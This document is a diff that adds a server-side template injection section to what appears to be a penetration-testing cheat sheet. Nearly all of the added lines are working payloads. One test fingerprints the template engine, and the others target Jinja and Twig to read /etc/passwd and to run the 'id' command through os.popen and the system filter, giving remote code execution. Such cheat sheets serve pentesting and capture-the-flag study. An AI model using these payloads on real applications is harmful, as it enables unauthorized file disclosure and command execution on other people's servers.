@@ -560,6 +560,23 @@ done
 | `ftp 127.0.0.1` | FTP to Server |
 | `su - user` | Switch to User |
 
+#SSTI
+```{{4*'4'}} --> 16 this is twig
+```
+```{{4*'4'}} --> 4444 this is jinja
+```
+## jinja 
+```python
+{{ self.__init__.__globals__.__builtins__ }} #get all builtins
+{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }} # lfi
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} #rce
+```
+##twig
+```python
+{{ "/etc/passwd"|file_excerpt(1,-1) }} #lfi
+{{ ['id'] | filter('system') }} #rce
+```
+
 # BROKEN AUTHENTICATION
 
 ## Fuzz
